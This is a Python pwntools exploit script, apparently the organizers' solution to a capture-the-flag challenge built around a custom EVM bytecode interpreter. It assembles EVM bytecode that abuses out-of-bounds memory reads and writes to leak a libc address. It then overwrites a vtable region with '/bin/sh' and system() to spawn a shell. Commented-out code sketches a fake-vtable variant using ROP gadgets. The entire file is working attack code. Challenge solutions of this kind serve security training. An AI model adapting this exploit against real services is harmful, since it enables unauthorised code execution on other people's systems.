from pwn import *

# r = process("./chatgpt_evm")
r = remote("localhost", 19191)
b = ELF("../prob/for_organizers/chatgpt_evm")
lib = ELF("../prob/for_organizers/libc.so.6")

opcode_table = {
    "STOP": 0x00,
    "ADD": 0x01,
    "MUL": 0x02,
    "SUB": 0x03,
    "DIV": 0x04,
    "SDIV": 0x05,
    "MOD": 0x06,
    "SMOD": 0x07,
    "ADDMOD": 0x08,
    "MULMOD": 0x09,
    "EXP": 0x0a,
    "SIGNEXTEND": 0x0b,
    "MLOAD": 0x51,
    "MSTORE": 0x52,
    "MSTORE8": 0x53,
    "SLOAD": 0x54,
    "SSTORE": 0x55,
    "PUSH1": 0x60,
    "PUSH4": 0x63,
    "PUSH2": 0x61,
    "PUSH32": 0x7f,
    "DUP1": 0x80,
    "DUP16": 0x8f,
    "SWAP1": 0x90,
    "SWAP16": 0x9f,
}

def assemble(evm_code):
    bytecode = bytearray()
    lines = evm_code.strip().split('\n')
    
    for line in lines:
        parts = line.split()
        op = parts[0].upper()
        if op.startswith("PUSH"):
            n = int(op[4:])
            bytecode.append(opcode_table[op])
            value = int(parts[1], 16)
            bytecode.extend(value.to_bytes(n, byteorder='big'))
        else:
            bytecode.append(opcode_table[op])
    
    return bytecode

## leak libc
vtable_offset = 0x11f0
vtable_offset = -vtable_offset & 0xffffffffffffffff
libc_offset = 0xee000 
evm_code = """
PUSH32 {}
MLOAD
STOP
""".format(hex(vtable_offset+0x1018))
bytecode = assemble(evm_code)

r.sendlineafter(": ",bytecode.hex())
r.recvuntil(": ")
data = r.recvline().strip().split(b" ")
leak_1 = b"".join(list(map(lambda x: x.zfill(2), data))).decode()
libc_base = u64(bytes.fromhex(leak_1[:16])) 
libc_base  += libc_offset
log.info("leak libc: "+hex(libc_base))

## system("/bin/sh")
system = libc_base + lib.symbols["system"]

evm_code = """
PUSH32 {}
PUSH32 {}
MSTORE
ADD
""".format(b'/bin/sh\x00'.hex() + "00" * 8 + system.to_bytes(8, 'little').hex() + "00"*8, hex(vtable_offset))
bytecode = assemble(evm_code)
r.sendlineafter(": ",bytecode.hex())

r.interactive()

# ## set fake vtable
# """
# 0x00000000000a774c : mov rdi, qword ptr [rdi + 0x48] ; mov rsi, r12 ; call rax
# 0x000000000007f809 : mov rdi, qword ptr [rdi + 0xe0] ; call rax
# 0x00000000001630f2 : mov esi, ebp ; mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
# """
# gadget = libc_base + 0x00000000001630f2
# system = libc_base + lib.symbols["system"]
# binsh = libc_base + next(lib.search(b"/bin/sh"))
# evm_code = """
# PUSH32 {}
# PUSH32 {}
# MSTORE
# """.format(system.to_bytes(8,'little').hex() * 3 + memory_start.to_bytes(8,'little').hex(), hex(0))
# bytecode = assemble(evm_code)
# r.sendlineafter(": ",bytecode.hex())
# r.recvline()

# evm_code = """
# PUSH32 {}
# PUSH32 {}
# MSTORE
# """.format(binsh.to_bytes(8,'little').hex(), hex(0x20))
# bytecode = assemble(evm_code)
# r.sendlineafter(": ",bytecode.hex())
# r.recvline()
# evm_code = """
# PUSH32 {}
# PUSH32 {}
# MSTORE
# """.format("41"*32, hex(0))
# bytecode = assemble(evm_code)
# r.sendlineafter(": ",bytecode.hex())
# r.recvline()

# evm_code = """
# PUSH32 {}
# PUSH32 {}
# MSTORE
# """.format("42"*32, hex(0x20))
# bytecode = assemble(evm_code)
# r.sendlineafter(": ",bytecode.hex())
# r.recvline()

# vtable_offset = 0x2780
# vtable_offset = -vtable_offset & 0xffffffffffffffff

# ## leak memory address
# evm_code = """
# PUSH32 {}
# MLOAD
# STOP
# """.format(hex(vtable_offset+0x80))
# bytecode = assemble(evm_code)
# print(bytecode)
# r.sendlineafter(": ",bytecode.hex())
# r.recvuntil(": ")
# data = r.recvline().strip().split(b" ")
# data = b"".join(list(map(lambda x: x.zfill(2), data))).decode()
# log.info(data)
# memory_start = u64(bytes.fromhex(data[:16]))
# memory_end= u64(bytes.fromhex(data[16:32]))
# log.info("memory_start: "+hex(memory_start))
# log.info("memory_end: "+hex(memory_end))


# fake_vtable = data[:16] + leak_1[16:]
# evm_code = """
# PUSH32 {}
# PUSH32 {}
# MSTORE
# """.format(fake_vtable, hex(vtable_offset))
# bytecode = assemble(evm_code)
# r.sendlineafter(": ",bytecode.hex())
# r.interactive()
